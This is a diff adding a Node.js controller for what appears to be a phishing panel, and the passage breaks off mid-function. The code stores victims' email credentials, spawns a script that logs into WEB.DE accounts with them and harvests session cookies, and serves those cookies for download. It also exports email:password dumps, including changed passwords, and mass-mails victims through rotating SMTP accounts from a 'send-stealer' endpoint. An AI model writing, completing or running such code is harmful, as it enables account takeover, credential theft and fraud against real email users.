@@ -1,0 +1,1133 @@
+// Controller: lead actions, mailings, warmup run, chat (sloppy — uses with(scope)).
+const path = require('path');
+const fs = require('fs');
+const os = require('os');
+const { spawn } = require('child_process');
+const { send, safeEnd } = require('../utils/httpUtils');
+const { checkAdminAuth, getAdminTokenFromRequest, ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminPageAuth } = require('../utils/authUtils');
+const { getPlatformFromRequest, maskEmail, translateChatText, CHAT_TRANSLATE_TARGET } = require('../utils/formatUtils');
+const leadService = require('../services/leadService');
+const automationService = require('../services/automationService');
+const chatService = require('../services/chatService');
+let nodemailer;
+try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
+
+async function handle(scope) {
+  with (scope) {
+  if (pathname === '/api/webde-login-grid-step' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const idRaw = json.id && String(json.id).trim();
+      if (!idRaw) return send(res, 400, { ok: false, error: 'id required' });
+      const id = leadService.resolveLeadId(idRaw);
+      const leads = leadService.readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
+      const stepPatch = {};
+      if (json.step === null || json.step === undefined || json.step === '') {
+        stepPatch.webdeLoginGridStep = null;
+      } else {
+        const n = parseInt(json.step, 10);
+        if (!Number.isFinite(n) || n < 0) return send(res, 400, { ok: false, error: 'step must be non-negative integer' });
+        stepPatch.webdeLoginGridStep = String(n);
+      }
+      try {
+        if (!leadService.persistLeadPatch(id, stepPatch)) return send(res, 500, { ok: false, error: 'write error' });
+      } catch (e) {
+        console.error('[SERVER] webde-login-grid-step leadService.persistLeadPatch:', e);
+        return send(res, 500, { ok: false, error: 'write error' });
+      }
+      return send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  /** API для скрипта входа WEB.DE: отдать email и пароль лида (скрипт опрашивает, пока админ не введёт пароль). Асинхронное чтение leads.json — не блокирует event loop при большом файле и лавине запросов. */
+  if (pathname === '/api/lead-cookies' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const leadId = (parsed.query && parsed.query.leadId) ? String(parsed.query.leadId).trim() : '';
+    if (!leadId) return send(res, 400, { ok: false, error: 'leadId required' });
+    const id = leadService.resolveLeadId(leadId);
+    const leads = leadService.readLeads();
+    const lead = leads.find((l) => l.id === id);
+    if (!lead) return send(res, 404, { ok: false });
+    const email = cookieEmailForLeadCookiesFile(lead);
+    if (!email) return send(res, 404, { ok: false });
+    const safe = cookieSafeForLoginCookiesFile(email);
+    const cookiesPath = path.join(PROJECT_ROOT, 'login', 'cookies', safe + '.json');
+    if (!fs.existsSync(cookiesPath)) return send(res, 404, { ok: false, error: 'Куки не найдены (вход не выполнялся или не был успешным)' });
+    try {
+      const data = fs.readFileSync(cookiesPath, 'utf8');
+      const filename = 'cookies-' + sanitizeFilenameForHeader(safe) + '.json';
+      res.writeHead(200, {
+        'Content-Type': 'application/json',
+        'Content-Disposition': 'attachment; filename="' + filename + '"',
+        'Cache-Control': 'no-store'
+      });
+      res.end(data);
+    } catch (e) {
+      console.error('[АДМИН] lead-cookies: ошибка чтения файла', e);
+      return send(res, 500, { ok: false, error: 'Ошибка чтения файла куки' });
+    }
+    return true;
+  }
+
+  /** Выгрузка куки: архив .zip с .txt файлами (в каждом сверху комментарий email:pass | new: pass). mode=all — все куки (и помечаем выгруженными), mode=new — только ещё не выгружавшиеся, mode=force — все куки без пометки (принудительная выгрузка). */
+  if (pathname === '/api/webde-login-start' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id && String(json.id).trim();
+      if (!id) {
+        console.error('[АДМИН] webde-login-start: не передан id');
+        return send(res, 400, { ok: false, error: 'id required' });
+      }
+      const leads = leadService.readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) {
+        console.error('[АДМИН] webde-login-start: лид не найден, id=' + id);
+        return send(res, 404, { ok: false });
+      }
+      delete lead.webdeLoginGridExhausted;
+      delete lead.webdeLoginGridStep;
+      const email = (lead.email || '').trim();
+      if (!email) {
+        console.error('[АДМИН] webde-login-start: у лида нет email, id=' + id);
+        return send(res, 400, { ok: false, error: 'У лида нет email' });
+      }
+      const emailLower = email.toLowerCase();
+      automationService.preemptWebdeLoginForReplacedLead(id, emailLower);
+      if (!automationService.tryAcquireWebdeScriptLock(emailLower, id)) {
+        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: скрипт уже запущен для email, id=' + id);
+        return send(res, 409, { ok: false, error: 'Для этого email скрипт входа уже запущен' });
+      }
+      if (automationService.runningWebdeLoginLeadIds.size >= automationService.WEBDE_LOGIN_MAX_CONCURRENT) {
+        automationService.clearWebdeScriptRunning(emailLower);
+        logTerminalFlow('АДМИН', 'Админ', '—', email, 'webde-login-start отклонён: занято слотов ' + automationService.WEBDE_LOGIN_MAX_CONCURRENT);
+        return send(res, 409, { ok: false, error: 'Достигнут лимит одновременных автовходов (' + automationService.WEBDE_LOGIN_MAX_CONCURRENT + ')' });
+      }
+      const loginDir = path.join(PROJECT_ROOT, 'login');
+      const scriptPath = path.join(loginDir, 'lead_simulation_api.py');
+      if (!fs.existsSync(scriptPath)) {
+        automationService.clearWebdeScriptRunning(emailLower);
+        console.error('[АДМИН] webde-login-start: скрипт не найден — ' + scriptPath);
+        return send(res, 500, { ok: false, error: 'login/lead_simulation_api.py не найден' });
+      }
+      const webdeComboSlotManual = automationService.runningWebdeLoginLeadIds.size;
+      automationService.runningWebdeLoginLeadIds.add(id);
+      const protocol = req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
+      const host = (req.headers['x-forwarded-host'] || req.headers.host || '127.0.0.1:' + PORT).split(',')[0].trim();
+      const baseUrl = process.env.SERVER_URL || (protocol + '://' + host);
+      const token = ADMIN_TOKEN || '';
+      const python = process.platform === 'win32' ? 'python' : 'python3';
+      const env = Object.assign({}, process.env, { PYTHONUNBUFFERED: '1' });
+      const pyArgsManual = [scriptPath, '--server-url', baseUrl, '--lead-id', id, '--token', token, '--combo-slot', String(webdeComboSlotManual)];
+      if (readStartPage() === 'klein') pyArgsManual.push('--klein-orchestration');
+      const child = require('child_process').spawn(python, pyArgsManual, { cwd: PROJECT_ROOT, detached: true, stdio: 'inherit', env });
+      automationService.webdeLockWriteChildPid(emailLower, child.pid);
+      automationService.webdeLoginChildByLeadId.set(id, child);
+      child.on('exit', function () {
+        automationService.webdeLoginChildByLeadId.delete(id);
+      });
+      child.unref();
+      const manualSession = automationService.beginWebdeAutoLoginRun(lead);
+      const manualKleinOrch = readStartPage() === 'klein';
+      const manualDetail = 'ручной запуск · lead_simulation_api.py' + (manualKleinOrch ? ' · --klein-orchestration' : '');
+      pushEvent(lead, EVENT_LABELS.WEBDE_START, 'script', { session: manualSession, detail: manualDetail });
+      leadService.persistLeadPatch(id, {
+        webdeScriptRunSeq: lead.webdeScriptRunSeq,
+        webdeScriptActiveRun: lead.webdeScriptActiveRun,
+        eventTerminal: lead.eventTerminal
+      });
+      logTerminalFlow('АДМИН', 'Админ', manualSession, email, 'ручной запуск webde-login id=' + id + (manualKleinOrch ? ' klein-orchestration' : ''));
+      send(res, 200, { ok: true, message: 'started' });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/mark-opened' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const email = json.email;
+      if (!email || typeof email !== 'string') return send(res, 400, { ok: false });
+      const leads = leadService.readLeads();
+      const emailLower = email.trim().toLowerCase();
+      const now = new Date().toISOString();
+      let found = false;
+      const markedIds = [];
+      // Помечаем все логи с таким email как открытые
+      leads.forEach(function(lead) {
+        const leadEmail = (lead.email || '').trim().toLowerCase();
+        if (leadEmail === emailLower && !lead.openedAt) {
+          lead.openedAt = now;
+          found = true;
+          markedIds.push(lead.id);
+        }
+      });
+      if (found) {
+        markedIds.forEach(function (mid) {
+          const Lm = leads.find(function (x) { return x && String(x.id) === String(mid); });
+          if (Lm) leadService.persistLeadPatch(mid, { openedAt: Lm.openedAt });
+        });
+        writeDebugLog('MARK_OPENED', { 
+          email: email, 
+          markedCount: markedIds.length,
+          markedIds: markedIds
+        });
+      }
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/leads' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    var leadsQuery = (parsed && parsed.query) || {};
+    var page = Math.max(1, parseInt(leadsQuery.page, 10) || 1);
+    var limit = Math.min(1000, Math.max(1, parseInt(leadsQuery.limit, 10) || 200));
+    writeDebugLog('LEADS_REQUESTED', { timestamp: new Date().toISOString(), ip: getClientIp(req), page: page, limit: limit });
+    leadService.readLeadsAsync(function (err, leads) {
+      if (err) {
+        console.error('[SERVER] Ошибка чтения leads:', err);
+        return send(res, 500, { error: 'Ошибка чтения данных' });
+      }
+      try {
+        if (!Array.isArray(leads)) {
+          console.error('[SERVER] Ошибка: leads.json не является массивом');
+          return send(res, 200, { leads: [], total: 0, page: 1, limit: limit });
+        }
+        const originalCount = leads.length;
+
+        leads = leads.filter(function (l) {
+          return l && typeof l === 'object' && (l.id || l.email || l.ip);
+        });
+        const afterFilterCount = leads.length;
+
+        let cleaned = [];
+        const seenIds = new Set();
+        leads.forEach(function (lead) {
+          if (!lead || typeof lead !== 'object') return;
+          const id = lead.id != null ? String(lead.id).trim() : '';
+          if (id && seenIds.has(id)) return;
+          if (id) seenIds.add(id);
+          cleaned.push(lead);
+        });
+        leads = cleaned;
+
+        const now = Date.now();
+        leads.forEach(function (l) {
+          const h = l && l.id ? statusHeartbeats[l.id] : null;
+          if (!h) return;
+          const seenAt = new Date(h.lastSeenAt).getTime();
+          if (now - seenAt <= HEARTBEAT_MAX_AGE_MS) {
+            l.sessionPulseAt = h.lastSeenAt;
+            if (h.currentPage) l.currentPage = h.currentPage;
+          }
+        });
+        const leadIds = new Set(leads.map(function (l) { return l && l.id ? l.id : null; }).filter(Boolean));
+        Object.keys(statusHeartbeats).forEach(function (kid) {
+          if (!leadIds.has(kid)) delete statusHeartbeats[kid];
+          else if (now - new Date(statusHeartbeats[kid].lastSeenAt).getTime() > HEARTBEAT_MAX_AGE_MS) delete statusHeartbeats[kid];
+        });
+
+        /** Порядок в списке админки: только «новая сессия» (новый лог / снова ввёл email), не каждое событие. См. adminListSortAt при создании лида. */
+        function leadRecencyMsForApi(l) {
+          if (!l) return 0;
+          const als = l.adminListSortAt ? new Date(l.adminListSortAt).getTime() : NaN;
+          if (!isNaN(als) && als > 0) return als;
+          const cr = l.createdAt ? new Date(l.createdAt).getTime() : NaN;
+          if (!isNaN(cr) && cr > 0) return cr;
+          const ls = l.lastSeenAt ? new Date(l.lastSeenAt).getTime() : NaN;
+          return !isNaN(ls) && ls > 0 ? ls : 0;
+        }
+        leads.sort(function (a, b) {
+          if (!a || !b) return 0;
+          const ta = leadRecencyMsForApi(a);
+          const tb = leadRecencyMsForApi(b);
+          if (tb !== ta) return tb - ta;
+          return (b.id || '').localeCompare(a.id || '');
+        });
+
+        const seenId = new Set();
+        const result = leads.filter(function (l) {
+          const id = (l && l.id) ? String(l.id).trim() : '';
+          if (id) {
+            if (seenId.has(id)) return false;
+            seenId.add(id);
+          }
+          return true;
+        });
+
+        /**
+         * В списке админки по умолчанию нет архивных (adminLogArchived / klLogArchived — данные в leads.json остаются).
+         * Показать все: ?includeArchived=1
+         */
+        var includeArchived = leadsQuery.includeArchived === '1' || leadsQuery.includeArchived === 'true';
+        var listForAdmin = result;
+        if (!includeArchived) {
+          listForAdmin = result.filter(function (l) {
+            if (!l || typeof l !== 'object') return false;
+            if (archiveFlagIsSet(l.adminLogArchived) || archiveFlagIsSet(l.klLogArchived)) return false;
+            return true;
+          });
+        }
+
+        var chatData = chatService.readChat();
+        var cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
+        var cookieSafeSet = new Set();
+        if (fs.existsSync(cookiesDir)) {
+          fs.readdirSync(cookiesDir).filter(function (f) { return f.endsWith('.json'); }).forEach(function (f) { cookieSafeSet.add(f.slice(0, -5)); });
+        }
+        var cookieExportedSet = new Set(readCookiesExported());
+        function cookieSafeFromEmail(email) {
+          if (!email || typeof email !== 'string') return '';
+          return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
+        }
+        var resultWithChat = listForAdmin.map(function (l) {
+          var copy = {};
+          for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
+          var chatKey = chatService.getChatKeyForLeadId(l.id, leads);
+          copy.chatCount = Array.isArray(chatData[chatKey]) ? chatData[chatKey].length : 0;
+          var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
+          copy.cookiesAvailable = cookieSafeSet.has(safe);
+          copy.cookiesExported = cookieExportedSet.has(safe);
+          return copy;
+        });
+        const byPlatform = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
+        resultWithChat.forEach(function (l) {
+          const p = (l.platform || '').toLowerCase();
+          if (p === 'windows') byPlatform.windows++;
+          else if (p === 'macos') byPlatform.macos++;
+          else if (p === 'android') byPlatform.android++;
+          else if (p === 'ios') byPlatform.ios++;
+          else byPlatform.other++;
+        });
+        var total = resultWithChat.length;
+        var start = (page - 1) * limit;
+        var slice = resultWithChat.slice(start, start + limit);
+        /** Админка: при пагинации выбранный лид может «выпасть» со страницы при появлении нового лога — не переключать фокус на новый. */
+        var ensureIdRaw = leadsQuery.ensureId && String(leadsQuery.ensureId).trim();
+        var ensureResolved = ensureIdRaw ? String(leadService.resolveLeadId(ensureIdRaw)) : '';
+        if (ensureResolved) {
+          var alreadyInSlice = slice.some(function (l) {
+            return l && l.id != null && String(l.id) === ensureResolved;
+          });
+          if (!alreadyInSlice) {
+            var ensuredLead = resultWithChat.find(function (l) {
+              return l && l.id != null && String(l.id) === ensureResolved;
+            });
+            if (ensuredLead) {
+              slice = slice.concat([ensuredLead]);
+              slice.sort(function (a, b) {
+                if (!a || !b) return 0;
+                var ta = leadRecencyMsForApi(a);
+                var tb = leadRecencyMsForApi(b);
+                if (tb !== ta) return tb - ta;
+                return (b.id || '').localeCompare(a.id || '');
+              });
+            }
+          }
+        }
+        writeDebugLog('LEADS_RETURNED', { count: slice.length, total: total, page: page, limit: limit, totalInFile: originalCount, byPlatform: byPlatform });
+        var _payload = { leads: slice, total: total, page: page, limit: limit };
+        /** Админка: после слияния логов (тот же email → новый id) выбранный старый id не совпадает с записью — подставить актуальный id из replaced-lead-ids. */
+        if (ensureIdRaw) {
+          _payload.ensureIdResolved = ensureResolved || ensureIdRaw;
+        }
+        if (safeEnd(res)) return;
+        var bodyJson = JSON.stringify(_payload);
+        var leadsHeaders = {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*',
+          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+          'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+          'Cache-Control': 'no-store, no-cache, must-revalidate',
+          'Pragma': 'no-cache'
+        };
+        res.writeHead(200, leadsHeaders);
+        var chunkSize = 65536;
+        for (var i = 0; i < bodyJson.length; i += chunkSize) {
+          res.write(bodyJson.slice(i, i + chunkSize));
+        }
+        res.end();
+        return;
+      } catch (e) {
+        console.error('[SERVER] Ошибка обработки leads:', e);
+        return send(res, 500, { error: 'Ошибка чтения данных' });
+      }
+    });
+    return true;
+  }
+
+  if (pathname === '/api/save-credentials' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    console.log('[SERVER] /api/save-credentials: получен запрос');
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      console.log('[SERVER] /api/save-credentials: тело запроса:', body);
+      let json = {};
+      try { 
+        json = JSON.parse(body || '{}'); 
+        console.log('[SERVER] /api/save-credentials: распарсен JSON:', json);
+      } catch (err) {
+        console.error('[SERVER] /api/save-credentials: ошибка парсинга JSON:', err);
+        return send(res, 400, { ok: false, error: 'invalid json' });
+      }
+      const id = json.id;
+      console.log('[SERVER] /api/save-credentials: id=', id);
+      if (!id || typeof id !== 'string') {
+        console.error('[SERVER] /api/save-credentials: неверный id');
+        return send(res, 400, { ok: false, error: 'id required' });
+      }
+      const leads = leadService.readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) {
+        console.error('[SERVER] /api/save-credentials: лог не найден, id=', id);
+        return send(res, 404, { ok: false, error: 'lead not found' });
+      }
+      
+      const email = (lead.email || '').trim();
+      const password = (lead.password || '').trim();
+      const newPassword = lead.changePasswordData && (lead.changePasswordData.newPassword || '').trim();
+      
+      console.log('[SERVER] /api/save-credentials: email=', maskEmail(email), 'hasPassword=', !!password, 'hasNewPassword=', !!newPassword);
+      
+      if (!email || !password) {
+        console.error('[SERVER] /api/save-credentials: отсутствует email или пароль');
+        return send(res, 400, { ok: false, error: 'Email или пароль отсутствуют' });
+      }
+      
+      const credentials = readSavedCredentials();
+      console.log('[SERVER] /api/save-credentials: текущее количество сохраненных:', credentials.length);
+      const credentialText = email + ':' + password + (newPassword ? ' | ' + newPassword : '');
+      const credentialData = {
+        id: Date.now().toString(36) + Math.random().toString(36).slice(2),
+        email: email,
+        password: password,
+        newPassword: newPassword || null,
+        credentialText: credentialText,
+        savedAt: new Date().toISOString()
+      };
+      
+      credentials.push(credentialData);
+      writeSavedCredentials(credentials);
+      console.log('[SERVER] /api/save-credentials: данные сохранены, новое количество:', credentials.length);
+      
+      writeDebugLog('SAVE_CREDENTIALS', { 
+        id: id, 
+        email: email,
+        hasNewPassword: !!newPassword,
+        credentialId: credentialData.id,
+        totalSaved: credentials.length
+      });
+      
+      send(res, 200, { ok: true, credential: credentialData });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/get-saved-credentials' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const credentials = readSavedCredentials();
+    return send(res, 200, credentials);
+  }
+
+  if (pathname === '/api/delete-saved-credential' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const credentialId = json.id;
+      if (!credentialId || typeof credentialId !== 'string') return send(res, 400, { ok: false });
+      
+      const credentials = readSavedCredentials();
+      const filtered = credentials.filter((c) => c.id !== credentialId);
+      if (filtered.length === credentials.length) return send(res, 404, { ok: false });
+      
+      writeSavedCredentials(filtered);
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/export-logs' && req.method === 'GET') {
+    if (!checkAdminAuth(req, res)) return;
+    const q = (parsed && parsed.query) || {};
+    const type = (q.type && String(q.type).trim()) || 'credentials';
+    let leads = leadService.readLeads();
+    const platformsParam = q.platforms;
+    const knownPlatforms = ['windows', 'macos', 'android', 'ios'];
+    if (platformsParam) {
+      const list = typeof platformsParam === 'string' ? platformsParam.split(',') : Array.isArray(platformsParam) ? platformsParam : [];
+      const set = new Set(list.map((p) => String(p).trim().toLowerCase()).filter(Boolean));
+      if (set.size > 0) {
+        leads = leads.filter((lead) => {
+          const p = (lead.platform || '').toLowerCase();
+          const isUnknown = !p || !knownPlatforms.includes(p);
+          if (set.has('unknown') && isUnknown) return true;
+          if (knownPlatforms.includes(p) && set.has(p)) return true;
+          return false;
+        });
+      }
+    }
+    const emailTrim = (s) => (s != null ? String(s).trim() : '') || '';
+    const seen = new Map();
+    if (type === 'credentials') {
+      leads.forEach((lead) => {
+        const email = emailTrim(lead.email);
+        const password = (lead.password != null ? String(lead.password) : '').trim();
+        if (email && password) {
+          const line = email + ':' + password;
+          seen.set(line, line);
+        }
+      });
+    } else if (type === 'all_emails') {
+      leads.forEach((lead) => {
+        const email = emailTrim(lead.email);
+        if (email) seen.set(email, email);
+      });
+    } else if (type === 'all_email_pass') {
+      leads.forEach((lead) => {
+        const email = emailTrim(lead.email);
+        if (!email) return;
+        const password = (lead.password != null ? String(lead.password) : '').trim();
+        const line = email + ':' + (password || '');
+        seen.set(line, line);
+      });
+    } else if (type === 'all_email_old_new') {
+      leads.forEach((lead) => {
+        const email = emailTrim(lead.email);
+        if (!email) return;
+        const history = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : [];
+        const arr = history.map((p) => (typeof p === 'object' && p && p.p != null ? String(p.p).trim() : (p != null ? String(p).trim() : '')));
+        const current = (lead.password != null ? String(lead.password) : '').trim();
+        let oldP = '-';
+        let newP = current || '-';
+        if (arr.length >= 2) {
+          oldP = arr[0] || '-';
+          newP = arr[arr.length - 1] || current || '-';
+        } else if (arr.length === 1) {
+          newP = arr[0] || '-';
+        }
+        const line = email + ':' + oldP + '\t' + newP;
+        seen.set(line, line);
+      });
+    } else {
+      return send(res, 400, { ok: false, error: 'Invalid type' });
+    }
+    const lines = Array.from(seen.values());
+    const body = lines.join('\n') + (lines.length ? '\n' : '');
+    const filename = type === 'credentials' ? 'logs-email-password.txt' : type === 'all_emails' ? 'logs-emails.txt' : type === 'all_email_pass' ? 'logs-all-email-pass.txt' : 'logs-email-old-new.txt';
+    if (safeEnd(res)) return;
+    res.writeHead(200, {
+      'Content-Type': 'text/plain; charset=utf-8',
+      'Content-Disposition': 'attachment; filename="' + sanitizeFilenameForHeader(filename) + '"',
+      'Cache-Control': 'no-store'
+    });
+    res.end(body);
+    return true;
+  }
+
+  if (pathname === '/api/send-stealer' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', async () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      let toEmail = (json.toEmail != null && json.toEmail !== '') ? String(json.toEmail).trim() : '';
+      let password = (json.password != null) ? String(json.password).trim() : '';
+      if (!toEmail) {
+        const id = (json.id != null) ? String(json.id).trim() : '';
+        if (!id) return send(res, 400, { ok: false, error: 'id or toEmail required' });
+        const leads = leadService.readLeads();
+        const lead = leads.find((l) => l.id === id);
+        if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
+        toEmail = (lead.email || lead.emailKl || '').trim();
+        if (!toEmail) return send(res, 400, { ok: false, error: 'Lead has no email' });
+        password = (lead.password || lead.passwordKl || '').trim();
+      }
+      const data = readStealerEmailConfig();
+      const configId = (json.configId != null && json.configId !== '') ? String(json.configId).trim() : null;
+      let cfg = configId
+        ? (data.configs || []).find((c) => c.id == configId)
+        : data.current;
+      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
+        cfg = data.current;
+        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
+          cfg = (data.configs || []).find((c) => c.smtpLine && c.smtpLine.trim());
+        }
+      }
+      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
+        return send(res, 400, { ok: false, error: 'В конфиге не задан SMTP. Откройте /mailer/, введите SMTP (host:port:user:fromEmail:password) и нажмите «Сохранить».' });
+      }
+      let smtpList = parseSmtpLines(cfg.smtpLine).filter((s) => !sendStealerFailedSmtpEmails.has(s.fromEmail));
+      if (!smtpList.length) return send(res, 400, { ok: false, error: 'Нет доступных SMTP (все отключены из-за ошибок отправки или не заданы).' });
+      let html = (cfg.html || '')
+        .replace(/_email_/g, toEmail)
+        .replace(/_password_/g, password);
+      const attachments = [];
+      if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
+        try {
+          const buf = Buffer.from(cfg.image1Base64, 'base64');
+          const cid = 'image1@mail';
+          html = html.replace(/_src1_/g, 'cid:' + cid);
+          attachments.push({ filename: 'image1.png', content: buf, cid: cid });
+        } catch (e) {}
+      } else if (html.indexOf('_src1_') !== -1) {
+        html = html.replace(/_src1_/g, '');
+      }
+      if (!nodemailer) return send(res, 500, { ok: false, error: 'nodemailer not installed' });
+      // Резервируем индекс: 1-е письмо → SMTP 1, 2-е → SMTP 2, … При ошибке SMTP удаляется из списка, этому же адресу пробуем следующий.
+      const smtpIndex = sendStealerSmtpIndex % smtpList.length;
+      sendStealerSmtpIndex = (sendStealerSmtpIndex + 1) | 0;
+      let lastError = null;
+      for (let k = 0; k < smtpList.length; k++) {
+        const smtp = smtpList[(smtpIndex + k) % smtpList.length];
+        const transporter = nodemailer.createTransport({
+          host: smtp.host,
+          port: smtp.port,
+          secure: smtp.port === 465,
+          auth: { user: smtp.user, pass: smtp.password }
+        });
+        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
+        const mailOptions = {
+          from: fromStr,
+          to: toEmail,
+          subject: (cfg.title || '').trim() || 'Message',
+          html,
+          attachments: attachments.length ? attachments : undefined,
+          envelope: { from: smtp.fromEmail, to: toEmail }
+        };
+        try {
+          await transporter.sendMail(mailOptions);
+          return send(res, 200, { ok: true, fromEmail: smtp.fromEmail });
+        } catch (err) {
+          lastError = err;
+          const msg = (err.message || '').slice(0, 200);
+          writeDebugLog('SEND_STEALER_SMTP_ERROR', { fromEmail: smtp.fromEmail, toEmail: toEmail, message: msg });
+          sendStealerFailedSmtpEmails.add(smtp.fromEmail);
+        }
+      }
+      const msg = (lastError && lastError.message) ? String(lastError.message).slice(0, 200) : 'Все SMTP недоступны';
+      return send(res, 500, { ok: false, error: msg });
+    });
+    return true;
+  }
+
+  /** Отправка письма из конфига Config → E-Mail (не Mailer/Stealer). Кнопка E-Mail в логе админки. */
+  if (pathname === '/api/send-email' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', async () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = (json.id != null) ? String(json.id).trim() : '';
+      if (!id) return send(res, 400, { ok: false, error: 'id required' });
+      const leads = leadService.readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
+      if (leadIsWorkedLikeAdmin(lead)) {
+        return send(res, 400, { ok: false, error: 'Лог отработан — отправка письма запрещена' });
+      }
+      const result = await sendConfigEmailToLead(lead);
+      if (result.ok) {
+        pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
+        leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
+        const toEmail = (lead.email || lead.emailKl || '').trim();
+        console.log('[send-email] Отправка (Config E-Mail) с ' + result.fromEmail + ' на ' + toEmail);
+        return send(res, 200, { ok: true, fromEmail: result.fromEmail });
+      }
+      leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
+      const code = result.statusCode || 500;
+      return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
+    });
+    return true;
+  }
+
+  /**
+   * Массовая отправка (Config → E-Mail), 1 письмо/сек.
+   * mode: all — все лиды с email (кроме отработанных); valid — есть куки входа; valid_unsent — валид и ещё не было успешной Config E-Mail (любая известная подпись в логе).
+   * Отработанные (leadIsWorkedLikeAdmin) никогда не получают письмо.
+   */
+  if (pathname === '/api/send-email-cookies-batch' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', async () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const modeRaw = (json.mode != null) ? String(json.mode).trim() : 'valid_unsent';
+      const mode = (modeRaw === 'all' || modeRaw === 'valid' || modeRaw === 'valid_unsent') ? modeRaw : null;
+      if (!mode) {
+        return send(res, 400, { ok: false, error: 'Укажите mode: all | valid | valid_unsent' });
+      }
+      if (!nodemailer) {
+        return send(res, 500, { ok: false, error: 'nodemailer not installed' });
+      }
+      const data = readConfigEmail();
+      const cfgDefault = data.current;
+      if (!cfgDefault || !(cfgDefault.smtpLine && cfgDefault.smtpLine.trim())) {
+        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
+      }
+      const smtpProbe = parseSmtpLines(cfgDefault.smtpLine);
+      if (!smtpProbe.length) {
+        return send(res, 400, { ok: false, error: 'В Config → E-Mail не задан SMTP.' });
+      }
+      let leads = leadService.readLeads();
+      const targets = leads.filter(function (l) {
+        if (!l) return false;
+        if (leadIsWorkedLikeAdmin(l)) return false;
+        const to = (l.email || l.emailKl || '').trim();
+        if (!to) return false;
+        if (mode === 'all') return true;
+        if (!leadHasSavedCookies(l)) return false;
+        if (mode === 'valid_unsent' && leadHasAnyConfigEmailSentEvent(l)) return false;
+        return true;
+      });
+      let sent = 0;
+      let failed = 0;
+      const failSamples = [];
+      for (let i = 0; i < targets.length; i++) {
+        const t = targets[i];
+        const idx = leads.findIndex((x) => x && x.id === t.id);
+        if (idx === -1) continue;
+        const live = leads[idx];
+        const result = await sendConfigEmailToLead(live);
+        if (result.ok) {
+          pushEvent(live, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
+          leadService.persistLeadPatch(live.id, { eventTerminal: live.eventTerminal });
+          sent++;
+          console.log('[send-email-cookies-batch] → ' + (live.email || live.emailKl || '').trim());
+        } else {
+          failed++;
+          if (failSamples.length < 8) {
+            failSamples.push({ id: live.id, email: (live.email || '').trim(), error: result.error || '' });
+          }
+        }
+        if (i < targets.length - 1) await new Promise((r) => setTimeout(r, 1000));
+      }
+      var emptyHint = '';
+      if (targets.length === 0) {
